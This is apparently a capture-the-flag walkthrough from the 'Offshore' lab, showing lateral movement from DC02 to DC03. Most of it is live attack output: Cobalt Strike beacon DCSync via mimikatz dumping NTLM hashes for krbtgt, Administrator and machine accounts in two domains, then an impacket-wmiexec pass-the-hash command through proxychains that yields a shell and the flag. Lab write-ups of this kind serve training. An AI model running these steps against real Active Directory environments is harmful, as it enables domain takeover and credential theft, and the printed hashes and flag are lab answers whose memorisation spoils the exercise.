
![[Pasted image 20240130175748.png]]
In order to get this flag you need to be on `DC02` and `DCsync` to `DC03`

from `DC02` ping `DC03` in cobalt strike to find that the IP address is `172.16.3.5`
![[Pasted image 20240130183158.png]]
looking in `BLOODHOUND` shows that `DC02` is able to `DCsync` to `DEV.ADMIN.OFFSHORE.COM`
![[Pasted image 20240130183308.png]]
setup a `socks` proxy on `DC02` and edited `/etc/proxychains4.conf` file
![[Pasted image 20240130183552.png]]
utilized `DCsync` option in `COBALTSTRIKE` beacon and was able to get `Administrator` hashes for `DC03`
```powershell
[01/30 15:58:57] beacon> dcsync DEV.ADMIN.OFFSHORE.COM
[01/30 15:58:57] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:DEV.ADMIN.OFFSHORE.COM /all /csv command
[01/30 15:58:57] [+] host called home, sent: 314691 bytes
[01/30 15:58:58] [+] received output:
[DC] 'DEV.ADMIN.OFFSHORE.COM' will be the domain
[DC] 'DC02.dev.ADMIN.OFFSHORE.COM' will be the DC server
[DC] Exporting domain 'DEV.ADMIN.OFFSHORE.COM'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502	krbtgt	9404def404bc198fd9830a3483869e78	514
1105	IIS_dev	ce18f9730484ed029749730e2f82b147	512
1000	DC02$	1a1d4bd303de23a5ca0e13cda66be2e3	532480
1104	WS03$	5cf7b4d94646e8efba50f45b88c12608	4096
500	Administrator	c61f43b6a4db2676714713836b7d2ea6	512
1103	ADMIN$	4752a416bd44628c9b2c08ae338ab871	2080
1109	CORP$	7d74315ac118e8c8a7972a317b636bf6	2080

[01/30 15:59:10] beacon> dcsync ADMIN.OFFSHORE.COM
[01/30 15:59:10] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:ADMIN.OFFSHORE.COM /all /csv command
[01/30 15:59:10] [+] host called home, sent: 314691 bytes
[01/30 15:59:11] [+] received output:
[DC] 'ADMIN.OFFSHORE.COM' will be the domain
[DC] 'DC03.ADMIN.OFFSHORE.COM' will be the DC server
[DC] Exporting domain 'ADMIN.OFFSHORE.COM'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502	krbtgt	ea9112d4beb759907688c9e267eff246	514
1107	MS01$	db505645b78f70ae01dd6cebbe4b2b8b	4096
1000	DC03$	a309490aabcffeea561fb1d8b36607d0	532480
1108	WS04$	2abf50d13b5e08b92ac2d90c1d125b99	4096
3101	DEV$	e2d58156ba42d6a8e83e931f5daaf62e	2080
3104	CLIENT$	8bd3e36602c3f8566f32ac3e1e69491f	2080
500	Administrator	f2594c9e60abf7e28e7601db343a7e24	512
3113	bankvault	0ce1cb01ade331cdba32d0e1fba338a1	512
14101	notreal	b35c7bf9b99f1c145e3899532e66a167	512
```
![[Pasted image 20240130183622.png]]
once I had the `DC03` `Administrator` hashes I was able to `wmiexec` onto the machine from `DC02`
```powershell
┌──(root💀gobots)-[30Jan2024 16:00:05]-[~]
└─# proxychains impacket-wmiexec ADMIN.OFFSHORE.COM/administrator@172.16.3.5 -hashes :f2594c9e60abf7e28e7601db343a7e24
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is AC12-0F78

 Directory of C:\

04/17/2021  03:54 PM    <DIR>          a20367908cc58c8e69b500
02/03/2020  12:01 PM    <DIR>          PerfLogs
04/20/2022  07:55 AM    <DIR>          Program Files
07/16/2016  08:23 AM    <DIR>          Program Files (x86)
07/17/2018  04:52 PM    <DIR>          Users
01/30/2024  04:02 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   4,805,275,648 bytes free

```
and grabbed the `flag.txt` file
```powershell
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is AC12-0F78

 Directory of C:\Users\Administrator\Desktop

11/09/2023  03:40 AM    <DIR>          .
11/09/2023  03:40 AM    <DIR>          ..
07/17/2018  04:52 PM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,805,275,648 bytes free

C:\Users\Administrator\Desktop>type flag.txt
OFFSHORE{w@tch_th0s3_3xtra_$ids}

```
got an `administrator` beacon and injected into `SYSTEM`


